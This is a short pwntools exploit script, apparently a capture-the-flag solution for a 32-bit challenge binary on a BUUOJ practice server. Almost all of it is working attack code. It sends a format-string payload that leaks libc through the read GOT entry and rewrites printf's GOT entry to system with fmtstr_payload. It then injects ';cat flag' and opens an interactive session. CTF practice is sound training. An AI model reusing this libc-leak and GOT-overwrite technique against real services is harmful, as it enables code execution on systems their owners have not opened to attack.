from pwn import *

context.log_level = 'debug'

pn = './axb_2019_fmt32'

#p = process(pn)
p = remote('node4.buuoj.cn', 26960)
elf = ELF(pn)
#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')
#gdb.attach(p, 'b *0x804874b')

printf_got = elf.got['printf']
read_got = elf.got['read']

#leak libc
payload = b'a' + p32(read_got) + b'%8$s'
p.sendlineafter('me:', payload)

p.recv(14)
libc_base = (u32(p.recv(4))) - libc.sym['read']
print('libc_base -> {}'.format(hex(libc_base)))

system = libc_base + libc.sym['system']

p.recvuntil(b'me:')

payload = b'a' + fmtstr_payload(8, { printf_got: system }, write_size = 'byte', numbwritten = 0x9 + 1)

p.sendline(payload)

p.sendlineafter(b'\n', b';cat flag')

p.interactive()
